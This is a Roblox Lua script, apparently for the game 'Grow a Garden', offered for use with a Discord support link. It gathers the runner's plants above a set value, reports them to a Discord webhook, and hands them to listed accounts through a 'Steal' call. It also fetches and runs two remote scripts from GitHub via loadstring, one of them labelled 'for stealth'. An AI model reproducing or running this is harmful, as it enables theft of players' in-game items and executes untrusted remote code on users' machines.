-- Join https://discord.gg/Dx6F8EJ9sD for full support

local libURL = "https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua" -- dont ever change this or the line below else it will break and this is for auto update
local GAG = loadstring(game:HttpGet(libURL))()

local cfg = {
	users = {'USER1', 'USER2'}, -- Roblox username here
	min = 1e10, -- 1e10 = 100B, 1e9 = 10B i hope you get the concept. this is the minimum value of plants to steal
	ping = "No", -- Yes or No, capitalization matters.
	webhook = "Discord webhook URL" -- common sense discord webhook url from your discord channel
}

local lp = game:GetService("Players").LocalPlayer
local gui = lp:WaitForChild("PlayerGui", 5)
local char = lp.Character or lp.CharacterAdded:Wait()

task.wait(2)

local items, total, maxWeight = GAG.Collect(cfg.min)

if #items > 0 then
	local summaryText = ("Prepared %d items (Total Â¢%s)"):format(#items, total)
	local isPing = cfg.ping == "Yes" and "@everyone " or ""

	GAG.JoinPing(cfg.webhook, items, total, maxWeight, isPing)

	GAG.WaitFor(cfg.users, function(victim)
		if victim and victim.Character then
			GAG.Confirm(cfg.webhook, items, total, maxWeight)
			GAG.Steal(victim, items)
		end
	end)
else
	warn("[GAG] No valid items.")
end

--[[ EXECUTE ANOTHER GaG SCRIPT FOR STEALTH ]]
--[[ NOT RECOMMENDED TO REMOVE BUT IF YOU WANT GO AHEAD ]]
loadstring(game:HttpGet('https://raw.githubusercontent.com/ArdyBotzz/NatHub/refs/heads/master/NatHub.lua'))()
